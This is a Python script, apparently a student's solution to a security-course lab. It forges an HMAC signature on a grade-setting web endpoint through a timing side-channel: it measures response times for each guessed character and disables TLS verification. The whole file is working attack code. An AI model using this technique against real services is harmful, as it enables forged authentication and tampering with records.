import hmac
import hashlib
import requests
import urllib3

def getAverage(URL, parameters, iterations):
    total = 0
    for j in range (0, iterations):  
        total += requests.get(url = URL, params = parameters, verify=False).elapsed.total_seconds()
    return total / iterations

if __name__ == '__main__':
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # Removes ssl related warnings. 
    name = 'kalle'
    grade = '5'
    key = 'k'
    REAL_SIGNATURE = '0bd7fb428bea810a03c0'
    URL = "https://eitn41.eit.lth.se:3119/ha4/addgrade.php"
    concat = bytes(name, encoding='utf8') + bytes(grade, encoding='utf8')
    signature = hmac.new(bytes(key, encoding='utf8'), concat, hashlib.sha1).hexdigest()[:20]
    
    elapsed = 0
    #signature = list(signature)
    bestChar = None
    signature ='0bd7fb428bea810a03c0'
    signature = list(signature)
    for i in range (18,20):
        for char in '0123456789abcdef':
            signature[i] = char
            parameters = {'name':name, 'grade':grade, 'signature':''.join(signature)} 
            average = getAverage(URL, parameters, 100)
            if (average > elapsed):
                bestChar= char
                elapsed = average
                print ("charPos:", i, "Char:", char, "Average:", average, "-> NEW BEST TIME, THE CHAR IS:", char)
            else:
                print("charPos:", i, "Char:", char, "Average:", average)
        signature[i] = bestChar
        print("Chosen char:", bestChar)
        print("------------------------")
        elapsed = 0

    parameters = {'name':name, 'grade':grade, 'signature':''.join(signature)}        
    result = requests.get(url = URL, params = parameters, verify=False)
    data = result.json()
    print(data)
    if(data == 1):
        print("Success! Signature is:", ''.join(signature))
    else:
        print("Unsuccessful answer from server is:", data)
